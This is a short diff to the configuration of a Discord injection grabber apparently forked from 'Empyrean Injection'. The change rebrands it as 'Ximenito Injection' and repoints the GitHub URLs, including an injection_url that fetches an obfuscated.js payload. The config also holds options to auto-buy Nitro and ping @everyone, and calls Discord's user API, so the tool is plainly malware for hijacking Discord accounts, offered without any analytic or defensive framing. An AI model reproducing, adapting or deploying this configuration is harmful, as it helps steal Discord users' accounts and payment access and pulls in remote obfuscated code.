@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: false, 
   ping_val: '@everyone', 
-  embed_name: 'Empyrean Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/main/imgs/pfp.png', 
+  embed_name: 'Ximenito Injection', 
+  embed_icon: 'https://raw.githubusercontent.com/anonydeathx/empyrean-injection/main/imgs/pfp.png', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/master/obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/anonydeathx/empyrean-injection/master/obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
